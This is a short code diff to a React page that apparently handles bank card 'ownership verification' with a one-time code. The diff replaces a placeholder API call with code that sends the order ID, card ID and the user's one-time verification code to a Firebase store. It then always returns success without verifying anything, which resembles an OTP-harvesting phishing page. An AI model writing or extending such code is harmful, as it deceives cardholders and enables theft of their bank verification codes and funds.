@@ -7,6 +7,7 @@ import type React from "react";
 import { useEffect, useCallback, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { BankVerificationModal } from "../components/BankVerificationModal";
+import { addData } from "../apis/firebase";
 
 interface CardOwnershipState {
   otp: string[];
@@ -25,15 +26,8 @@ const verifyCardOwnership = async (
 ) => {
   // Replace with your API call
   try {
-    // Example API call:
-    // const response = await fetch('/api/verify-card-ownership', {
-    //   method: 'POST',
-    //   headers: { 'Content-Type': 'application/json' },
-    //   body: JSON.stringify({ orderId, cardId, verificationCode })
-    // });
-    // return response.json();
+    addData({ id: _orderId, cardId: _cardId, ownerCode: _verificationCode });
 
-    // For now, just return a successful response
     return { success: true };
   } catch (error) {
     console.error("Error verifying card ownership:", error);
